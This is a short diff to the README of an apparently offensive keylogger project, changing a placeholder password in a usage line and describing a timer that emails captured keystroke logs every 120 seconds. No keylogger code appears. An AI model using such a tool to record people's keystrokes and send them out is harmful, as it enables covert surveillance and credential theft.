@@ -1,6 +1,6 @@
 # Keylogger
 
-> my_keylogger = Keylogger(120, "your-email", "your-password")
+> my_keylogger = Keylogger(120, "your-email", "email-password")
 
 firts argument: timer (send the log to my email every 120 seconds)
 
